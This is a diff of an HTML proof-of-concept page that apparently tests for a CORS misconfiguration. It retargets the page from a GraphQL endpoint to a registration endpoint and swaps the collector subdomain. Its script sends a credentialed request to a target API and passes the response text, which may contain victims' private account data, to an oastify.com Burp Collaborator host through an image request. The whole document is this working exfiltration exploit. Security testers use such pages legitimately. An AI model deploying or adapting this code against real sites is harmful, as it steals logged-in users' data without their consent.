@@ -4,14 +4,14 @@
     <script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
-        req.open('GET', 'https://api.render.com/graphql', true);
+        req.open('POST', 'https://quitplan.ycq2.org/api/register', true);
         req.withCredentials = true;
         req.send();
 
         function reqListener() {
             // Send the response data to your Burp Collaborator server
             var img = new Image();
-            img.src = 'https://je11mp6q8tm2jlalu7947ftpwg27q0toi.oastify.com/?data=' + encodeURIComponent(this.responseText);
+            img.src = 'https://r7zu5d6e9bjwqc0zebao5294cvim6mub.oastify.com/?data=' + encodeURIComponent(this.responseText);
         }
     </script>
 </head>
